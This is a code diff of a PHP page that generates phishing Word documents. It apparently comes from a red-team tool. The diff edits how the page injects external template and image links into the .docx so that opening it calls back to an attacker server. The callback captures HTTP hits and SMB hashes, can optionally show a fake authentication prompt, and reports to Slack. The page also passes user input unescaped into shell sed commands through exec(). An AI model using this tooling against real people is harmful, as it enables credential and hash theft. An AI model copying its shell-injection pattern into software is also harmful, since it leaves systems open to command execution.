@@ -287,15 +287,12 @@ if(isset($_REQUEST['URL'])){
 
 // Receives and Cleans Input From Create Payload Form
 $URL = stripslashes($_REQUEST['URL']);
-$HTTPValue = stripslashes($_REQUEST['HTTPValue']);
 $Target = stripslashes($_REQUEST['Target']);
 $Org = stripslashes($_REQUEST['Org']);
 
 
 $URL = str_replace('"', "", $URL);
 $URL = str_replace("'", "", $URL);
-$HTTPValue = str_replace('"', "", $HTTPValue);
-$HTTPValue = str_replace("'", "", $HTTPValue);
 $Target = str_replace('"', "", $Target);
 $Target = str_replace("'", "", $Target);
 $Target = preg_replace('/[^a-zA-Z0-9 ]/', '', $Target);
@@ -378,7 +375,7 @@ $posrels = strpos($settingsxmlrels, "</Relationships>");
 $beforerels = substr($settingsxmlrels, 0, $posrels);
 
 $settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
-                        Target=\"HTTPVALUE://URLVALUE/phishingdocs/REPLACEME\"
+                        Target=\"URLVALUE/phishingdocs/REPLACEME\"
                         TargetMode=\"External\"/>";
 
 $settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
@@ -399,10 +396,6 @@ $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)
 $cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
 exec($cmd15,$output15);
 //var_dump($output15);
-
-$cmd17 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
-exec($cmd17,$output17);
-//var_dump($output17);
 
 $cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
 exec($cmd18,$output18);
@@ -428,7 +421,7 @@ $cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
 exec ($cmd3,$outputcmd2);
 //var_dump($outputcmd2);
 
-$cmd4 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($HTTPValue).'://'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd4 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd4 = escapeshellcmd($cmd4);
 exec($cmd4,$output4);
 //var_dump($output4);
@@ -468,20 +461,11 @@ $cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.re
 exec($cmd15,$output15);
 //var_dump($output15);
 
-$cmd17 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/settings.xml.rels;";
-exec($cmd17,$output17);
-//var_dump($output17);
-
 $cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
 exec($cmd18,$output18);
 //var_dump($output18);
 
 }
-
-$cmd9 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/document.xml.rels;";
-//$cmd9 = escapeshellcmd($cmd9);
-exec($cmd9,$output9);
-//var_dump($output9);
 
 $cmd10 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
 //$cmd10 = escapeshellcmd($cmd10);
@@ -572,10 +556,10 @@ else {
 <FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
 <TABLE>
 <TR>
-<TH COLSPAN="2">API URL</TH><TH>Target</TH><TH>Organization</TH><TH>Payloads</TH><TH COLSPAN="2">Slack Settings<br>(Not Required)</TH>
+<TH>API URL</TH><TH>Target</TH><TH>Organization</TH><TH>Payloads</TH><TH COLSPAN="2">Slack Settings<br>(Not Required)</TH>
 </TR>
 <TR>
-<TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https" selected>https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $APIDomain;?>:8080"></TD><TD><input type="text" name="Target" value="Joe Smith" size="10"></TD><TD><input type="text" name="Org" value="Evil Corp" size="10"></TD><TD><font size="2">HTTP Call </font><input type="checkbox" disabled checked><br><font size="2">SMB Hash </font><input type="checkbox" disabled checked><br><font size="2">Auth Prompt <input type="checkbox" name="basicauth"></font></TD><TD align="center" style="vertical-align:bottom"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br><FONT SIZE="2">Not Required if Set in Conf</font></TD><TD align="center" style="vertical-align:bottom"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br><font size="2">Not Required if Set in Conf</font></TD>
+<TD><input type="text" name="URL" value="<?php echo $APIDomain;?>"></TD><TD><input type="text" name="Target" value="Joe Smith" size="10"></TD><TD><input type="text" name="Org" value="Evil Corp" size="10"></TD><TD><font size="2">HTTP Call </font><input type="checkbox" disabled checked><br><font size="2">SMB Hash </font><input type="checkbox" disabled checked><br><font size="2">Auth Prompt <input type="checkbox" name="basicauth"></font></TD><TD align="center" style="vertical-align:bottom"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br><FONT SIZE="2">Not Required if Set in Conf</font></TD><TD align="center" style="vertical-align:bottom"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br><font size="2">Not Required if Set in Conf</font></TD>
 </TR>
 <TR>
 <TD COLSPAN="7">
